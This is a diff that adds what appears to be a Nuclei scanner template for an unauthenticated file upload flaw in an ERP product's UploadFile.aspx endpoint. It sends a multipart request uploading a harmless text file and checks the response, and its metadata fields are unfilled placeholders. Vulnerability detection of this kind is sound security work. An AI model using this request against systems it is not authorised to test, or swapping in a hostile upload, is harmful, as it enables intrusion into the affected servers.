@@ -1,0 +1,30 @@
+id: tianwenwuye-erp-UploadFile-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /HM/M_Main/IntroductionManage/UploadFile.aspx HTTP/1.1
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        User-Agent: Java/1.8.0_301
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 119
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+
+        123
+        --00content0boundary00--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
